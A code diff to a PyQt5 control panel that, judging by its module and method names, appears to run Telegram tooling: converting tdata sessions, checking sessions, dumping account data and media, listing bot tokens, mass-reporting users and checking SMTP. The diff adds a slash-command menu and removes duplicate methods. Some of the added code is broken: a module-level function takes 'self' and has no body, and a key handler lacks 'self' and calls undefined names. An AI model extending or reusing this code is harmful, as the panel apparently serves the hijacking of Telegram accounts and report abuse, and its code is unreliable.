@@ -32,19 +32,29 @@ import smtplib
 from PyQt5.QtWidgets import QMainWindow, QTextEdit, QMessageBox, QApplication
 from PyQt5.QtGui import QTextCursor
 from PyQt5.QtCore import QThread, pyqtSignal
-
+from bot.button_handlers import *
+from panel_commands import *
 
 # Import specific functions if needed
-from bot.bot import launch_bot, list_tokens
+from bot.bot import *
 from convert.convert_tdata import convert_tdata
 from dumper_functions.checker import check_sess
 from dumper_functions.xuy import Result
 from dumper_functions.results import saver
 from telethon.network import ConnectionTcpFull
+import datetime  # or from datetime import date
 
-
+def displayStatsAndCounts(self):
+    today_date = datetime.date.today().strftime('%Y-%m-%d')  # Use this line if importing the entire module
 
 tracemalloc.start()
+
+commands = [
+    "/grant_user - Grants user permissions",
+    "/remove_user - Removes user permissions",
+    "/list_users - Lists all users",
+    "/help - Shows this help message"
+]
 
 
 
@@ -201,7 +211,7 @@ class MainWindow(QtWidgets.QMainWindow):
         self.saveMedia_button.clicked.connect(self.saveMedia_function)
         self.generate_button.clicked.connect(self.generate_function)
         self.live_session_button.clicked.connect(self.live_session_function)
-            
+
         self.dumper = DumperFunctions(
             self.console_text_edit_2,
             self.dumping_file_directory_comboBox,
@@ -289,6 +299,7 @@ class MainWindow(QtWidgets.QMainWindow):
         self.loadBotsFromDatabase()
         self.displayStatsAndCounts()
         self.updateTokenCount()
+        self.console_text_response_input.textChanged.connect(self.check_for_command)
 
 
         
@@ -316,6 +327,32 @@ class MainWindow(QtWidgets.QMainWindow):
         self.timer.start(10)  # 10ms interval
         self.reporting_reason_comboBox.currentTextChanged.connect(self.update_letter_console)
         self.smtp_check_button.clicked.connect(self.start_smtp_check)
+
+    def show_command_menu(self):
+        """Display available commands."""
+        command_list = "\n".join(commands)
+        return f"Available Commands:\n{command_list}"
+
+    def check_for_command(self):
+        """Check for command input."""
+        message = self.console_text_response_input.toPlainText()
+
+        # Check if the last character is '/'
+        if message and message[-1] == '/':
+            command_menu = self.show_command_menu()  # Call the instance method
+            self.show_command_menu_dialog(command_menu)
+
+    def show_command_menu_dialog(self, command_menu):
+        """Show command menu in a message box."""
+        QMessageBox.information(self, "Command Menu", command_menu)
+
+
+    def on_key_release(event):
+        # Check if the last character is '/'
+        if event.char == '/':
+            # Show command menu in a message box or console
+            command_menu = show_command_menu()
+            messagebox.showinfo("Command Menu", command_menu)
 
     def start_smtp_check(self):
         self.progressBar.setValue(0)
@@ -384,15 +421,6 @@ class MainWindow(QtWidgets.QMainWindow):
     
         # Optional: Play a sound to notify the user
         QApplication.beep()
-
-    def update_results(self, message, success):
-        # ... existing code ...
-
-        # Update counters
-        self.total_checks += 1
-        if success:
-            self.successful_checks += 1
-
 
 
 
@@ -569,9 +597,6 @@ class MainWindow(QtWidgets.QMainWindow):
 
     def start_login(self):
         asyncio.ensure_future(self.login_to_telegram(), loop=self.loop)
-
-    def start_report(self):
-        asyncio.ensure_future(self.report_telegram_user(), loop=self.loop)
 
     async def login_to_telegram(self):
         api_id = self.api_id_textedit.toPlainText()
@@ -1297,12 +1322,6 @@ class MainWindow(QtWidgets.QMainWindow):
             self.tdata_console_textedit.append(str(result))
 
 
-
-
-
-    def update_tdata_console(self, message):
-        self.tdata_console_textedit.append(message)
-
     async def check(self, tdata_path: str, sess: str, sem: Semaphore):
         # Your check logic here
         pass
@@ -1364,11 +1383,6 @@ class MainWindow(QtWidgets.QMainWindow):
         current_value = self.progressBar.value()
         if current_value < 100:
             self.progressBar.setValue(current_value + 1)
-
-    def update_tdata_console(self, message):
-        self.tdata_console_textedit.append(message)
-        self.tdata_console_textedit.verticalScrollBar().setValue(
-            self.tdata_console_textedit.verticalScrollBar().maximum())
 
 
     def loadTdataDirectory(self):
@@ -1451,14 +1465,6 @@ class MainWindow(QtWidgets.QMainWindow):
     async def save_media_photo(bot, chat_id, photo):
         user_media_dir = os.path.join(base_path, chat_id, 'media')
         await safe_api_request(bot.download_file(photo, os.path.join(user_media_dir, f'{photo.id}.jpg')), 'download media photo')
-
-    def stop_function(self):
-        try:
-            process_id = "your_process_id_here"
-            os.kill(process_id, signal.SIGTERM)
-            self.displaySuccessMessage("Process stopped successfully.")
-        except OSError:
-            self.displayErrorMessage("Failed to stop the process.")
 
 
     def displayJSON(self, json_data):
